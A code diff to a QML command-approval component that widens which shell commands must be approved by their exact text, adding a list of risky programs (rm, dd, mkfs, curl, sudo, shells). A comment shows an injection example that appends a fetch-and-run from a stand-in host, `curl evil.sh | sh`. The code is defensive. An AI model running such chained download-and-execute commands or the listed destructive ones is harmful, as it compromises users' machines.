@@ -102,15 +102,30 @@ QtObject {
         return found;
     }
 
+    // Programs where the arguments decide whether the command is destructive.
+    // `find . -name x` and `find / -delete` share a program and nothing else.
+    readonly property var argumentsDecideRisk: [
+        "rm", "rmdir", "shred", "dd", "truncate", "mv", "cp", "install", "tee",
+        "chmod", "chown", "chgrp", "setfacl", "find", "xargs",
+        "mkfs", "fdisk", "sgdisk", "parted", "wipefs", "mount", "umount",
+        "kill", "pkill", "killall", "systemctl", "loginctl", "hyprctl",
+        "curl", "wget", "ssh", "scp", "rsync", "git",
+        "pacman", "yay", "paru", "apt", "dnf", "sudo", "doas", "su",
+        "sh", "bash", "zsh", "fish", "python", "python3", "node", "bun", "perl",
+    ]
+
     // The key an approval is stored and matched under. A plain command is keyed by its
     // program, so approving `free -h` also covers `free -m`. Anything carrying shell
     // metacharacters is keyed by the whole string: approving `du -sh ~` must not hand
-    // over `du -sh ~; curl evil.sh | sh`.
+    // over `du -sh ~; curl evil.sh | sh`. So is anything on the list above, where a
+    // program-wide rule would be a rule about a verb rather than about what it does.
     function commandRule(command: string): string {
         const cmd = command.trim();
-        const meta = [";", "|", "&", ">", "<", "\n", "$(", "`"];
+        const meta = [";", "|", "&", ">", "<", "\n", "$(", "`", "\\"];
         if (meta.some(c => cmd.includes(c))) return cmd;
-        return cmd.split(/\s+/)[0];
+        const program = cmd.split(/\s+/)[0];
+        const base = program.split("/").pop();
+        return root.argumentsDecideRisk.includes(base) ? cmd : program;
     }
 
     function isPreApproved(name: string, args: var): bool {
